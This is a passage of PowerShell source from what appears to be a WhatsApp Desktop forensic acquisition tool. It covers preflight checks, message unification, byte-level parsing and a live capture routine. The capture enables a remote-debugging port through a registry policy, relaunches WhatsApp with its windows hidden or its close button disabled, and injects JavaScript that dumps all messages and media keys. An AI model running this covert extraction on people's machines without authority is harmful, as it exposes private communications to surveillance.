    $archiveCommand = if ($ArchivePath) { "python `"$scriptPath`" --unify `"$ArchivePath`"$mediaFlag" } else { $null }
    $content = @(
        "WAren6 unify-later commands",
        "",
        "Python was not available on this evidence machine, so acquisition/decryption was preserved and unification can be done later.",
        "",
        "From a PC with Python and ccl_chromium_reader installed:",
        $caseCommand
    )
    if ($archiveCommand) {
        $content += ""
        $content += "Or process the archived case directly:"
        $content += $archiveCommand
    }
    $out = Join-Path $CasePath "WAren6_unify_later.txt"
    $content | Out-File -LiteralPath $out -Encoding UTF8
    return $out
}

function Invoke-WAren6Unify {
    param(
        [Parameter(Mandatory = $true)]
        [string]$CasePath,
        [Parameter(Mandatory = $false)]
        [string]$RuntimeStore8Jsonl,
        [Parameter(Mandatory = $false)]
        [switch]$WithMedia,
        [Parameter(Mandatory = $false)]
        [string]$ReportTimezone = "local",
        [Parameter(Mandatory = $false)]
        [switch]$GenerateReports,
        [Parameter(Mandatory = $false)]
        [switch]$OnlineBootstrap
    )

    $pythonExe = Resolve-WAren6PythonExe
    if (-not $pythonExe) {
        Write-Warning "Python was not found. WAren6 will write unify-later instructions instead."
        return $false
    }

    & $pythonExe -c "import ccl_chromium_reader" 2>$null
    if ($LASTEXITCODE -ne 0) {
        $wheelsDir = Join-Path $PSScriptRoot "wheels"
        if (Test-Path -LiteralPath $wheelsDir) {
            Write-WAren6Output "  [>] Installing Python dependency from local wheels..."
            & $pythonExe -m pip install --quiet --no-index --find-links $wheelsDir ccl_chromium_reader 2>&1 | Out-Null
        }
        elseif ($OnlineBootstrap) {
            Write-WAren6Output "  [>] Online bootstrap enabled; installing Python dependency..."
            & $pythonExe -m pip install --quiet --user git+https://github.com/cclgroupltd/ccl_chromium_reader.git 2>&1 | Out-Null
        }
    }

    $scriptPath = Join-Path $PSScriptRoot "waren6.py"
    $unifyArgs = @(
        $scriptPath,
        "--unify", $CasePath,
        "--report-timezone", $ReportTimezone,
        "--tool-version", $global:WAren6Version
    )
    if ($GenerateReports) {
        $unifyArgs += @(
            "--reports-dir", (Join-Path $CasePath "reports"),
            "--report-formats", "html,jsonl,csv,tsv,pdf",
            "--report-scope", "all"
        )
    }
    if ($WithMedia) {
        $unifyArgs += "--with-media-index"
    }
    if ($RuntimeStore8Jsonl) {
        $unifyArgs += @("--runtime-store8-jsonl", $RuntimeStore8Jsonl)
    }

    & $pythonExe @unifyArgs
    return ($LASTEXITCODE -eq 0)
}

function Invoke-WAren6Doctor {
    param(
        [Parameter(Mandatory = $false)]
        [string]$WhatsAppPath,
        [Parameter(Mandatory = $false)]
        [string]$OutputPath,
        [Parameter(Mandatory = $false)]
        [switch]$NoNet
    )

    $checks = New-Object System.Collections.Generic.List[object]
    function Add-DoctorCheck {
        param(
            [Parameter(Mandatory = $true)][string]$Name,
            [Parameter(Mandatory = $true)][bool]$Ok,
            [Parameter(Mandatory = $false)][string]$Detail = ""
        )
        $checks.Add([PSCustomObject]@{ Name = $Name; Ok = $Ok; Detail = $Detail }) | Out-Null
        $mark = if ($Ok) { "[OK]" } else { "[!]" }
        Write-WAren6Output ("  {0} {1}{2}" -f $mark, $Name, $(if ($Detail) { ": $Detail" } else { "" }))
    }

    Write-WAren6Output ""
    Write-WAren6Output "WAren6 doctor preflight"
    Write-WAren6Output "Version: $global:WAren6Version"
    Write-WAren6Output "Root: $PSScriptRoot"
    Write-WAren6Output ""

    Add-DoctorCheck -Name "PowerShell 5.1+" -Ok ($PSVersionTable.PSVersion.Major -ge 5) -Detail ($PSVersionTable.PSVersion.ToString())

    foreach ($required in @("waren6.ps1", "waren6.py", "waren6_unify_case.py", "BouncyCastle.Cryptography.dll", "requirements-lock.txt")) {
        $path = Join-Path $PSScriptRoot $required
        Add-DoctorCheck -Name "Required file $required" -Ok (Test-Path -LiteralPath $path -PathType Leaf)
    }
    foreach ($requiredDir in @("airgap", "waren6-reader")) {
        $path = Join-Path $PSScriptRoot $requiredDir
        Add-DoctorCheck -Name "Required folder $requiredDir" -Ok (Test-Path -LiteralPath $path -PathType Container)
    }

    try {
        Add-Type -Path (Join-Path $PSScriptRoot "BouncyCastle.Cryptography.dll") -ErrorAction Stop
        Add-DoctorCheck -Name "BouncyCastle load" -Ok $true
    }
    catch {
        Add-DoctorCheck -Name "BouncyCastle load" -Ok $false -Detail $_.Exception.Message
    }

    $pythonExe = Resolve-WAren6PythonExe
    Add-DoctorCheck -Name "Python 3" -Ok ([bool]$pythonExe) -Detail $(if ($pythonExe) { $pythonExe } else { "not found" })
    $wheelsDir = Join-Path $PSScriptRoot "wheels"
    $hasWheels = Test-Path -LiteralPath $wheelsDir -PathType Container
    if ($pythonExe) {
        & $pythonExe -c "import ccl_chromium_reader" 2>$null
        $hasCcl = $LASTEXITCODE -eq 0
        $cclOk = $hasCcl -or $hasWheels -or (-not $NoNet)
        $cclDetail = if ($hasCcl) { "available" } elseif ($hasWheels) { "missing; local wheels available" } elseif (-not $NoNet) { "missing; online bootstrap allowed" } else { "missing and --no-net is set" }
        Add-DoctorCheck -Name "Python dependency ccl_chromium_reader" -Ok $cclOk -Detail $cclDetail
    }

    Add-DoctorCheck -Name "Offline wheels folder" -Ok ($hasWheels -or (-not $NoNet)) -Detail $(if ($hasWheels) { "available" } elseif ($NoNet) { "missing and --no-net is set" } else { "missing; online bootstrap allowed" })
    $embeddedPython = Join-Path $PSScriptRoot "python_embedded\python.exe"
    $hasEmbeddedPython = Test-Path -LiteralPath $embeddedPython -PathType Leaf
    Add-DoctorCheck -Name "Embedded Python" -Ok $true -Detail $(if ($hasEmbeddedPython) { "available" } else { "not bundled" })

    $waPath = $WhatsAppPath
    if (-not $waPath) {
        $waPath = Get-AppLocalStatePath -AppName "WhatsApp"
    }
    Add-DoctorCheck -Name "WhatsApp LocalState" -Ok ([bool]$waPath -and (Test-Path -LiteralPath $waPath -PathType Container)) -Detail $(if ($waPath) { $waPath } else { "not found; use -w/--wa for copied evidence" })

    $tarAvailable = [bool](Get-Command tar.exe -ErrorAction SilentlyContinue)
    Add-DoctorCheck -Name "tar.exe" -Ok $tarAvailable -Detail $(if ($tarAvailable) { "available" } else { "zip fallback only" })
    Add-DoctorCheck -Name "tar zstd support" -Ok (Test-WAren6TarZstdAvailable) -Detail $(if (Test-WAren6TarZstdAvailable) { ".tar.zst preferred" } else { ".zip fallback" })

    $outRoot = if ($OutputPath) { $OutputPath } else { $PWD.Path }
    try {
        New-Item -ItemType Directory -Force -Path $outRoot | Out-Null
        $probe = Join-Path $outRoot (".waren6-doctor-" + [guid]::NewGuid().ToString("N") + ".tmp")
        "WAren6 doctor" | Out-File -LiteralPath $probe -Encoding UTF8 -Force
        Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue
        Add-DoctorCheck -Name "Output folder writable" -Ok $true -Detail $outRoot
    }
    catch {
        Add-DoctorCheck -Name "Output folder writable" -Ok $false -Detail $_.Exception.Message
    }

    if ($NoNet) {
        Add-DoctorCheck -Name "Network bootstrap" -Ok $true -Detail "disabled by --no-net"
    }
    else {
        Add-DoctorCheck -Name "Network bootstrap" -Ok $true -Detail "allowed for dependency setup only"
    }

    $failed = @($checks | Where-Object { -not $_.Ok })
    Write-WAren6Output ""
    if ($failed.Count -gt 0) {
        Write-WAren6Output "Doctor result: attention needed ($($failed.Count) check(s) failed)."
        $script:WAren6DoctorExit = 1
        return
    }
    Write-WAren6Output "Doctor result: ready."
    $script:WAren6DoctorExit = 0
    return
}

function Initialize-WAren6WindowApi {
    if ("WAren6WindowApi" -as [type]) {
        return
    }
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class WAren6WindowApi {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
    [DllImport("user32.dll")]
    public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
    [DllImport("user32.dll")]
    public static extern bool DrawMenuBar(IntPtr hWnd);
}
'@ | Out-Null
}

function Set-WAren6ProcessWindowVisible {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ProcessNamePattern,
        [Parameter(Mandatory = $true)]
        [bool]$Visible
    )

    Initialize-WAren6WindowApi
    $command = if ($Visible) { 5 } else { 0 }
    Get-Process -Name $ProcessNamePattern -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowHandle -ne 0 } |
        ForEach-Object {
            [WAren6WindowApi]::ShowWindow($_.MainWindowHandle, $command) | Out-Null
        }
}

function Hide-WAren6WhatsAppWindows {
    Set-WAren6ProcessWindowVisible -ProcessNamePattern "*WhatsApp*" -Visible:$false
}

function Hide-WAren6WhatsAppWindowsForPeriod {
    param(
        [Parameter(Mandatory = $false)]
        [int]$Seconds = 6,
        [Parameter(Mandatory = $false)]
        [int]$IntervalMilliseconds = 200
    )

    $deadline = (Get-Date).AddSeconds($Seconds)
    do {
        Hide-WAren6WhatsAppWindows
        Start-Sleep -Milliseconds $IntervalMilliseconds
    } while ((Get-Date) -lt $deadline)
}

function Disable-WAren6WhatsAppClose {
    Initialize-WAren6WindowApi
    $scClose = [uint32]0xF060
    $mfByCommand = [uint32]0x00000000
    $mfGrayed = [uint32]0x00000001
    Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowHandle -ne 0 } |
        ForEach-Object {
            try {
                $menu = [WAren6WindowApi]::GetSystemMenu($_.MainWindowHandle, $false)
                if ($menu -ne [IntPtr]::Zero) {
                    [WAren6WindowApi]::EnableMenuItem($menu, $scClose, ($mfByCommand -bor $mfGrayed)) | Out-Null
                    [WAren6WindowApi]::DrawMenuBar($_.MainWindowHandle) | Out-Null
                }
            }
            catch { }
        }
}

function Enable-WAren6WhatsAppClose {
    Initialize-WAren6WindowApi
    Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowHandle -ne 0 } |
        ForEach-Object {
            try {
                [WAren6WindowApi]::GetSystemMenu($_.MainWindowHandle, $true) | Out-Null
                [WAren6WindowApi]::DrawMenuBar($_.MainWindowHandle) | Out-Null
            }
            catch { }
        }
}

function Invoke-WAren6WhatsAppRuntimeLaunch {
    param(
        [Parameter(Mandatory = $false)]
        [switch]$Silent
    )

    Start-Process "explorer.exe" "shell:AppsFolder\5319275A.WhatsAppDesktop_cv1g1gvanyjgm!App" -WindowStyle Hidden | Out-Null
    if ($Silent) {
        Hide-WAren6WhatsAppWindows
        Start-Sleep -Milliseconds 500
        Hide-WAren6WhatsAppWindows
    }
    else {
        Start-Sleep -Seconds 2
    }
}

function Get-WAren6RuntimeExpression {
    return @'
(async () => {
  const table = require("WAWebSchemaMessage").getMessageTable();
  const serializer = require("WAWebDBMessageSerialization");
  const rows = await table.all();
  function s(v){ if(v==null) return null; if(typeof v==="string") return v; if(typeof v==="number"||typeof v==="boolean") return String(v); try{return v.toString();}catch(e){return null;} }
  function jid(v){ if(v==null) return null; if(typeof v==="string") return v; if(v._serialized) return v._serialized; if(v.user && v.server) return `${v.user}@${v.server}`; return s(v); }
  function text(v){ const t=s(v); return t && t.length ? t : null; }
  function olen(v){ return v ? (v.byteLength || v.length || null) : null; }
  function list(v){ if(v==null) return []; if(Array.isArray(v)) return v; if(v instanceof Set) return Array.from(v); if(typeof v==="object" && v.models) return Array.from(v.models); return [v]; }
  function jids(v){ return list(v).map(x => jid(x && (x.id || x.jid || x._serialized || x))).filter(Boolean); }
  function normalizeMsgKey(v){
    if(v==null) return null;
    if(typeof v==="string") return v;
    if(v._serialized) return v._serialized;
    if(v.msg_key) return s(v.msg_key);
    if(v.msgKey) return s(v.msgKey);
    if(v.id && typeof v.id==="string" && v.id.includes("_")) return v.id;
    const remote = jid(v.remoteJid || v.remote_jid || v.chatJid || v.chat_jid);
    const stanza = s(v.stanzaId || v.stanza_id || v.id);
    if(remote && stanza){
      const dir = v.fromMe || v.from_me ? "true" : "false";
      const participant = jid(v.participant || v.participantJid || v.sender_jid);
      return participant && remote.includes("@g.us") ? `${dir}_${remote}_${stanza}_${participant}` : `${dir}_${remote}_${stanza}`;
    }
    return s(v);
  }
  const messages = [];
  const byType = {};
  let withText = 0, serializerErrors = 0;
  for (const row of rows) {
    let msg = null;
    try { msg = serializer.messageFromDbRow(row); } catch(e) { serializerErrors += 1; msg = {}; }
    const msgKey = s(row.id || (msg && msg.id));
    const body = text(msg && msg.body);
    const caption = text(msg && msg.caption);
    const title = text(msg && msg.title);
    const description = text(msg && msg.description);
    const matchedText = text(msg && msg.matchedText);
    const recovered = body || caption || title || description || matchedText;
    const quotedMsg = msg && (msg.quotedMsg || msg.quotedMessage || null);
    const quotedStanzaId = text(
      (msg && (msg.quotedStanzaID || msg.quotedStanzaId || msg.quotedMsgId)) ||
      row.quotedStanzaID ||
      row.quotedStanzaId ||
      row.quotedMsgId
    );
    const quotedParticipant = jid(
      (msg && (msg.quotedParticipant || msg.quotedParticipantJid)) ||
      row.quotedParticipant ||
      row.quotedParticipantJid
    );
    const quotedMsgType = text((quotedMsg && quotedMsg.type) || (msg && msg.quotedMsgType) || row.quotedMsgType);
    const quotedMsgBody = text(
      (quotedMsg && (quotedMsg.body || quotedMsg.caption || quotedMsg.text || quotedMsg.title || quotedMsg.description)) ||
      (msg && (msg.quotedMsgBody || msg.quotedBody || msg.quotedCaption)) ||
      row.quotedMsgBody
    );
    const protocolMessage = (msg && (msg.protocolMessage || msg.protocol_message)) || row.protocolMessage || row.protocol_message || null;
    const protocolMessageKey = normalizeMsgKey(
      (msg && (msg.protocolMessageKey || msg.editTargetMsgKey || msg.edit_target_msg_key)) ||
      row.protocolMessageKey ||
      row.editTargetMsgKey ||
      (protocolMessage && (protocolMessage.key || protocolMessage.messageKey || protocolMessage.protocolMessageKey))
    );
    const latestEditMsgKey = normalizeMsgKey(
      (msg && (msg.latestEditMsgKey || msg.latestEditKey)) ||
      row.latestEditMsgKey ||
      row.latestEditKey
    );
    const latestEditSenderTimestampMs =
      (msg && (msg.latestEditSenderTimestampMs || msg.latestEditTimestamp)) ??
      row.latestEditSenderTimestampMs ??
      row.latestEditTimestamp ??
      null;
    const editMsgType = text(
      (msg && (msg.editMsgType || msg.edit_msg_type)) ||
      row.editMsgType ||
      (protocolMessage && (protocolMessage.type || protocolMessage.subtype))
    );
    if (recovered) withText += 1;
    const msgType = s((msg && msg.type) || row.type);
    byType[msgType || "unknown"] = (byType[msgType || "unknown"] || 0) + 1;
    const record = {
      schema: "waren6.live-runtime-store8-message.v1",
      source: "whatsapp_webview2_runtime",
      msg_key: msgKey,
      timestamp: row.t ?? (msg && msg.t) ?? null,
      row_id: row.rowId ?? null,
      type: msgType,
      subtype: s((msg && msg.subtype) || row.subtype),
      from_me: msgKey ? msgKey.startsWith("true_") : null,
      chat_jid: s((msg && msg.to) || row.to || (msg && msg.from) || row.from),
      sender_jid: s((msg && msg.author) || row.author || row.sender),
      quoted_stanza_id: quotedStanzaId,
      quoted_participant: quotedParticipant,
      quoted_msg_body: quotedMsgBody,
      quoted_msg_type: quotedMsgType,
      latest_edit_msg_key: latestEditMsgKey,
      latest_edit_sender_timestamp_ms: latestEditSenderTimestampMs,
      protocol_message_key: protocolMessageKey,
      edit_msg_type: editMsgType,
      mentioned_jids: jids((msg && (msg.mentionedJidList || msg.mentionedJids || msg.mentionedIds || msg.mentions)) || row.mentionedJidList || row.mentionedJids || row.mentionedIds || row.mentions),
      mention_all: Boolean((msg && (msg.mentionedEveryone || msg.mentionAll || msg.isMentionAll)) || row.mentionedEveryone || row.mentionAll || row.isMentionAll),
      body, caption, title, description,
      matched_text: matchedText,
      filename: text((msg && msg.filename) || row.filename),
      mimetype: text((msg && msg.mimetype) || row.mimetype),
      media_key: text(row.mediaKey || (msg && msg.mediaKey)),
      media_key_timestamp: row.mediaKeyTimestamp ?? (msg && msg.mediaKeyTimestamp) ?? null,
      filehash: text(row.filehash || (msg && msg.filehash)),
      enc_filehash: text(row.encFilehash || (msg && msg.encFilehash)),
      static_url: text(row.staticUrl || (msg && msg.staticUrl)),
      direct_path: text(row.directPath || (msg && msg.directPath)),
      deprecated_mms3_url: text(row.deprecatedMms3Url || (msg && msg.deprecatedMms3Url)),
      thumbnail_direct_path: text(row.thumbnailDirectPath || (msg && msg.thumbnailDirectPath)),
      thumbnail_sha256: text(row.thumbnailSha256 || (msg && msg.thumbnailSha256)),
      thumbnail_enc_sha256: text(row.thumbnailEncSha256 || (msg && msg.thumbnailEncSha256)),
      media_size: row.size ?? (msg && msg.size) ?? null,
      duration: row.duration ?? (msg && msg.duration) ?? null,
      width: row.width ?? (msg && msg.width) ?? null,
      height: row.height ?? (msg && msg.height) ?? null,
      opaque_byte_length: olen(row.msgRowOpaqueData),
      serializer_recovered_text: Boolean(recovered)
    };
    messages.push(JSON.stringify(record));
  }
  return {
    schema: "waren6.live-runtime-store8-capture.v1",
    capture_version: "1.0.0",
    href: location.href,
    title: document.title,
    total_store8_rows: rows.length,
    captured_rows: messages.length,
    rows_with_text: withText,
    rows_without_text: messages.length - withText,
    serializer_errors: serializerErrors,
    by_type: byType,
    messages_jsonl: messages.join("\n")
  };
})()
'@
}

function Invoke-WAren6CdpMethod {
    param(
        [Parameter(Mandatory = $true)]
        [System.Net.WebSockets.ClientWebSocket]$Socket,
        [Parameter(Mandatory = $true)]
        [int]$Id,
        [Parameter(Mandatory = $true)]
        [string]$Method,
        [Parameter(Mandatory = $false)]
        [object]$Params = @{}
    )

    $payload = @{ id = $Id; method = $Method; params = $Params } | ConvertTo-Json -Depth 30 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    $segment = [ArraySegment[byte]]::new($bytes)
    $Socket.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult() | Out-Null

    while ($true) {
        $ms = New-Object System.IO.MemoryStream
        do {
            $buffer = New-Object byte[] 1048576
            $receiveSegment = [ArraySegment[byte]]::new($buffer)
            $result = $Socket.ReceiveAsync($receiveSegment, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
            if ($result.Count -gt 0) {
                $ms.Write($buffer, 0, $result.Count)
            }
        } while (-not $result.EndOfMessage)

        $json = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
        $message = $json | ConvertFrom-Json
        if ($message.id -ne $Id) {
            continue
        }
        if ($message.error) {
            throw "CDP $Method failed: $($message.error | ConvertTo-Json -Compress)"
        }
        return $message.result
    }
}

function Invoke-WAren6RuntimeStore8Capture {
    param(
        [Parameter(Mandatory = $true)]
        [string]$OutputDirectory,
        [Parameter(Mandatory = $false)]
        [int]$Port = 9222,
        [Parameter(Mandatory = $false)]
        [switch]$Silent,
        [Parameter(Mandatory = $false)]
        [switch]$BlockClose
    )

    $runtimeDir = Join-Path $OutputDirectory "runtime"
    New-Item -ItemType Directory -Force -Path $runtimeDir | Out-Null
    $jsonlPath = Join-Path $runtimeDir "runtime_store8_messages.jsonl"
    $summaryPath = Join-Path $runtimeDir "runtime_store8_messages.summary.json"
    $regPath = "HKCU:\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments"
    $valueName = "WhatsApp.Root.exe"
    $oldValue = $null
    $hadOldValue = $false

    try {
        if (Test-Path $regPath) {
            $props = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            if ($props.PSObject.Properties.Name -contains $valueName) {
                $hadOldValue = $true
                $oldValue = $props.$valueName
            }
        }
        else {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $valueName -Value "--remote-debugging-port=$Port --remote-debugging-address=127.0.0.1" -Type String

        Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Invoke-WAren6WhatsAppRuntimeLaunch -Silent:$Silent
        if ($BlockClose -and -not $Silent) {
            Disable-WAren6WhatsAppClose
        }

        $targets = $null
        for ($i = 0; $i -lt 90; $i++) {
            Start-Sleep -Seconds 1
            if ($Silent) {
                Hide-WAren6WhatsAppWindows
            }
            elseif ($BlockClose) {
                $running = Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue
                if (-not $running) {
                    Write-WAren6Output "  [>] WhatsApp closed during live capture; relaunching runtime..."
                    Invoke-WAren6WhatsAppRuntimeLaunch -Silent:$Silent
                }
                Disable-WAren6WhatsAppClose
            }
            try {
                $targets = Invoke-RestMethod -Uri "http://127.0.0.1:$Port/json/list" -TimeoutSec 2
                $page = $targets | Where-Object { $_.type -eq "page" -and $_.url -match "web\.whatsapp\.com" } | Select-Object -First 1
                if ($page) { break }
            }
            catch { }
            $page = $null
        }
        if (-not $page) {
            throw "WhatsApp WebView2 runtime did not expose a web.whatsapp.com DevTools page."
        }

        $socket = [System.Net.WebSockets.ClientWebSocket]::new()
        [void]$socket.ConnectAsync([Uri]$page.webSocketDebuggerUrl, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
        try {
            Invoke-WAren6CdpMethod -Socket $socket -Id 1 -Method "Runtime.enable" | Out-Null
            $payload = $null
            $lastRuntimeException = $null
            for ($attempt = 1; $attempt -le 20; $attempt++) {
                $result = Invoke-WAren6CdpMethod -Socket $socket -Id (1 + $attempt) -Method "Runtime.evaluate" -Params @{
                    expression = Get-WAren6RuntimeExpression
                    awaitPromise = $true
                    returnByValue = $true
                }
                if ($result.exceptionDetails) {
                    $exceptionDescription = $null
                    try { $exceptionDescription = [string]$result.exceptionDetails.exception.description } catch { }
                    if ([string]::IsNullOrWhiteSpace($exceptionDescription)) {
                        try { $exceptionDescription = [string]$result.exceptionDetails.text } catch { }
                    }
                    if ([string]::IsNullOrWhiteSpace($exceptionDescription)) {
                        $exceptionDescription = "unknown JavaScript exception"
                    }
                    $lastRuntimeException = $exceptionDescription
                    if ($attempt -ge 20) {
                        throw "Runtime JS evaluation failed: $exceptionDescription"
                    }
                    Start-Sleep -Seconds 3
                    continue
                }
                $payload = $result.result.value
                $hasJsonlPayload = $payload -and $payload.messages_jsonl -and ([string]$payload.messages_jsonl).Length -gt 0
                $hasLegacyMessages = $payload -and $payload.messages -and $payload.messages.Count -gt 0
                if ($hasJsonlPayload -or $hasLegacyMessages) {
                    break
                }
                Start-Sleep -Seconds 3
            }
            $hasJsonlPayload = $payload -and $payload.messages_jsonl -and ([string]$payload.messages_jsonl).Length -gt 0
            $hasLegacyMessages = $payload -and $payload.messages -and $payload.messages.Count -gt 0
            if (-not $hasJsonlPayload -and -not $hasLegacyMessages) {
                if ($lastRuntimeException) {
                    throw "Runtime JS evaluation failed: $lastRuntimeException"
                }
                throw "Runtime returned no Store 8 messages."
            }

            $writer = [System.IO.StreamWriter]::new($jsonlPath, $false, [System.Text.UTF8Encoding]::new($false))
            try {
                if ($payload.messages_jsonl) {
                    $writer.Write($payload.messages_jsonl)
                    if (-not ([string]$payload.messages_jsonl).EndsWith("`n")) {
                        $writer.WriteLine()
                    }
                }
                else {
                    foreach ($message in $payload.messages) {
                        if ($message -is [string]) {
                            $writer.WriteLine($message)
                        }
                        else {
                            $writer.WriteLine(($message | ConvertTo-Json -Depth 20 -Compress))
                        }
                    }
                }
            }
            finally {
                $writer.Dispose()
            }
            $summary = [PSCustomObject]@{
                schema = "waren6.live-runtime-store8-summary.v1"
                capturedAtUtc = (Get-Date).ToUniversalTime().ToString("o")
                targetUrl = "https://web.whatsapp.com/"
                targetTitle = $payload.title
                totalStore8Rows = $payload.total_store8_rows
                capturedRows = $payload.captured_rows
                rowsWithText = $payload.rows_with_text
                rowsWithoutText = $payload.rows_without_text
                serializerErrors = $payload.serializer_errors
                outputJsonl = "<case-root>\runtime\runtime_store8_messages.jsonl"
                outputJsonlSha256 = Get-WAren6FileSha256Hex -Path $jsonlPath
            }
            $summary | ConvertTo-Json -Depth 8 | Out-File -LiteralPath $summaryPath -Encoding UTF8
            return $jsonlPath
        }
        finally {
            if ($socket) { $socket.Dispose() }
        }
    }
    finally {
        if ($BlockClose -and -not $Silent) {
            Enable-WAren6WhatsAppClose
        }
        if ($hadOldValue) {
            Set-ItemProperty -Path $regPath -Name $valueName -Value $oldValue -Type String
        }
        else {
            Remove-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
        }
    }
}

function Test-WAren6RuntimeJsonl {
    param(
        [Parameter(Mandatory = $false)]
        [AllowEmptyString()]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        return $false
    }
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $false
    }
    try {
        return ((Get-Item -LiteralPath $Path).Length -gt 0)
    }
    catch {
        return $false
    }
}

function Copy-WAren6RuntimeSupplement {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SourceJsonl,
        [Parameter(Mandatory = $true)]
        [string]$DestinationCaseRoot
    )

    if (-not (Test-WAren6RuntimeJsonl -Path $SourceJsonl)) {
        return $null
    }

    $runtimeDir = Join-Path $DestinationCaseRoot "runtime"
    New-Item -ItemType Directory -Force -Path $runtimeDir | Out-Null
    $destJsonl = Join-Path $runtimeDir "runtime_store8_messages.jsonl"
    Copy-Item -LiteralPath $SourceJsonl -Destination $destJsonl -Force

    $sourceSummary = Join-Path (Split-Path -Path $SourceJsonl -Parent) "runtime_store8_messages.summary.json"
    $destSummary = Join-Path $runtimeDir "runtime_store8_messages.summary.json"
    if (Test-Path -LiteralPath $sourceSummary -PathType Leaf) {
        try {
            $summary = Get-Content -Raw -LiteralPath $sourceSummary | ConvertFrom-Json
            $summary.targetUrl = "https://web.whatsapp.com/"
            $summary.outputJsonl = "<case-root>\runtime\runtime_store8_messages.jsonl"
            $summary.outputJsonlSha256 = Get-WAren6FileSha256Hex -Path $destJsonl
            $summary | ConvertTo-Json -Depth 8 | Out-File -LiteralPath $destSummary -Encoding UTF8
        }
        catch {
            Copy-Item -LiteralPath $sourceSummary -Destination $destSummary -Force
        }
    }

    return $destJsonl
}

function Find-Signature {
    param (
        [byte[]]$ByteArray,
        [byte[]]$Signature,
        [int]$BytesToSkip,
        [bool]$UseNibble = $true
    )

    $sigLength = $Signature.Length
    $index = 0
    $maxIndex = $ByteArray.Length - $sigLength

    while ($index -le $maxIndex) {
        $match = $true
        for ($i = 0; $i -lt $sigLength; $i++) {
            if ($ByteArray[$index + $i] -ne $Signature[$i]) {
                $match = $false
                break
            }
        }

        if ($match) {
            $sizeIndicatorIndex = $index + $sigLength + $BytesToSkip
            if ($sizeIndicatorIndex -ge $ByteArray.Length) {
                Write-Verbose "Not enough data to read size indicator byte."
                return
            }

            $sizeIndicatorByte = $ByteArray[$sizeIndicatorIndex]
            if ($Signature -join ',' -eq '2,1,4,48' -and $sizeIndicatorByte -in @(0x81, 0x82)) {
                $firstRightNibble = $sizeIndicatorByte -band 0x0F

                if ($firstRightNibble -eq 1) {
                    $sizeIndicatorIndex += 3 # Skips the single byte and the 0x04 after
                }
                elseif ($firstRightNibble -eq 2) {
                    $sizeIndicatorIndex += 4 # Skips the two bytes and the 0x04 after
                }
                else {
                    Write-Verbose "Unexpected nibble value after signature."
                    return
                }

                if ($sizeIndicatorIndex -ge $ByteArray.Length) {
                    Write-Verbose "Reached end of array before actual size indicator byte."
                    return
                }

                $sizeIndicatorByte = $ByteArray[$sizeIndicatorIndex]
                $UseNibble = $true
            }
            elseif (-not ($Signature -join ',' -eq '2,1,4,48') -and $sizeIndicatorByte -in @(0x81, 0x82)) {
                $UseNibble = $true
            }
            if ($UseNibble) {
                # Use right nibble to get number of size bytes. This is founded in research only, experimental.
                $rightNibble = $sizeIndicatorByte -band 0x0F
                $sizeBytesStart = $sizeIndicatorIndex + 1
                $sizeBytesEnd = $sizeBytesStart + $rightNibble - 1
                if ($sizeBytesEnd -ge $ByteArray.Length) {
                    Write-Verbose "Not enough data to read size field."
                    return
                }
                $sizeBytes = $ByteArray[$sizeBytesStart..$sizeBytesEnd]
                $sizeValue = 0
                foreach ($b in $sizeBytes) {
                    $sizeValue = ($sizeValue -shl 8) -bor $b
                }

                $dataStart = $sizeBytesEnd + 1
            }
            else {
                $sizeValue = $sizeIndicatorByte
                $dataStart = $sizeIndicatorIndex + 1
                $rightNibble = $null
                $sizeBytes = @()
            }

            $dataEnd = $dataStart + $sizeValue - 1
            if ($dataEnd -ge $ByteArray.Length) {
                Write-Verbose "Not enough data to read full blob."
                return
            }

            $dataBlob = $ByteArray[$dataStart..$dataEnd]
            $dataHex = ($dataBlob | ForEach-Object { $_.ToString("X2") }) -join ''
            return $sizeValue, $dataBlob, $dataHex
        }

        $index++
    }
    Write-Verbose "Signature $Signature not found."
}

function Get-WalSettingsData {
    param (
        [string]$FilePath
    )

    if (-not (Test-Path $FilePath)) { 
        Write-Error "File not found: $FilePath"
        return $null 
    }

    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    }
    catch {
        Write-Error "Error reading file: $($_.Exception.Message)"
        return $null
    }

    $pageSize = [System.Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($bytes, 8))
    $offset = 32
    $results = New-Object System.Collections.Generic.List[PSObject]

    while ($offset + 24 + $pageSize -le $bytes.Length) {
        $pStart = $offset + 24
        $pEnd = $pStart + $pageSize
        
        # scan byte per byte
        for ($cursor = $pStart; $cursor -lt ($pEnd - 3); $cursor++) {
            
            # Header Size 3  (Key, Value)
            if ($bytes[$cursor] -eq 0x03) {
                $kType = $bytes[$cursor + 1]
                $vType = $bytes[$cursor + 2]
                
                $kVal = $null
                $kLen = 0
                $dataStart = $cursor + 3

                # Identify Key
                if ($kType -eq 8) { $kVal = 0; $kLen = 0 }
                elseif ($kType -eq 9) { $kVal = 1; $kLen = 0 }
                elseif ($kType -eq 1) { 
